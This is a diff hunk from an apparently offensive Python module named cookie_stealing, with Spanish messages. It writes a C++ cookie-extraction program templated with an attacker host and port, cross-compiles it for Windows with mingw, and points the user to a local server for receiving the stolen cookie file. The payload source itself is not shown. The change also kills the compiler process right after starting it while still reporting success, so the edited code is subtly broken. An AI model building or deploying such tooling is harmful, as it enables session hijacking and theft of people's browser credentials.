@@ -136,16 +136,16 @@ class cookie_stealing(Module):
        }
 
        ''' % (lhost, lport, nombre_archivo_cookies)
-
 		f = open(fullname,"w")
 		f.write(EXTRAERCOOKIES)
 		print("Archivo "+ fullname + " creado.")
 		#i686-w64-mingw32-g++ extraerCookies.cpp -o extrae -static-libgcc -static-libstdc++ -lwsock32
 		args = ["i686-w64-mingw32-g++", fullname, "-o", outfile, "-static-libgcc", "-static-libstdc++", "-lwsock32"]
-		subprocess.Popen(args)
+		p = subprocess.Popen(args)
+		p.terminate()
 		print("Compilado {}.".format(outfile))
-		print("Iniciando servidor local para recibir archivo.")
-		time.sleep(5)
-		args = ['terminator', '--new-tab', '-x', 'python3', 'base/modules/transferfiles/recvfiles.py']
-		subprocess.Popen()
+		print("Inicia tu servidor local para recibir archivo.")
+		#time.sleep(5)
+		#args = ['terminator', '--new-tab', '-x', 'python3', 'base/modules/transferfiles/recvfiles.py']
+		#subprocess.Popen()
 		
